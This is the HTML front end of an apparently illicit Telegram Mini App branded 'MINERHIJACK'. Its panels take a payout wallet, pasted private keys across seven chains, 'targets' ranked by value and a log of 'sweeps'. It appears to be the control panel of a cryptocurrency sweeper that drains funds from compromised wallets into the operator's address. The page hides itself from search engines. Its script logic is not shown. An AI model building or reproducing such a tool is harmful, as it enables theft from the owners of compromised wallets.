<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive">
<title>hijack</title>
<link rel="stylesheet" href="/static/style.css">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<header>
  <div class="brand">MINER<span>HIJACK</span></div>
  <div id="who" class="who">connecting…</div>
</header>

<main id="gate" class="hidden">
  <h2>Telegram only</h2>
  <p>Open this Mini App from the bot. Plain browsers cannot hold a session.</p>
</main>

<main id="app" class="hidden">
  <section class="card">
    <label>payout wallet (EVM)</label>
    <div class="row">
      <input id="wallet" placeholder="0x…" spellcheck="false" autocomplete="off">
      <button id="save">save</button>
    </div>
    <div class="row">
      <label class="sw"><input id="active" type="checkbox"> engine on</label>
      <label class="sw">min $<input id="minUsd" type="number" step="0.5" min="0" value="1"></label>
    </div>
    <div class="row">
      <button id="scan" class="ghost">scan now</button>
      <span id="stat" class="stat"></span>
    </div>
  </section>

  <section class="card">
    <h3>targets <small>highest value first</small></h3>
    <div id="targets" class="list"></div>
  </section>

  <section class="card">
    <h3>sweep keys</h3>
    <div class="row">
      <input id="pk" placeholder="private key" autocomplete="off" spellcheck="false">
      <select id="chain">
        <option>eth</option><option>bnb</option><option>matic</option>
        <option>base</option><option>arbitrum</option><option>optimism</option>
        <option>avalanche</option>
      </select>
      <button id="addKey">add</button>
    </div>
    <div id="wallets" class="list"></div>
  </section>

  <section class="card">
    <h3>sweeps</h3>
    <div id="sweeps" class="list"></div>
  </section>

  <section class="card">
    <h3>log</h3>
    <pre id="logs"></pre>
  </section>
</main>

<script src="/static/app.js"></script>
</body>
</html>
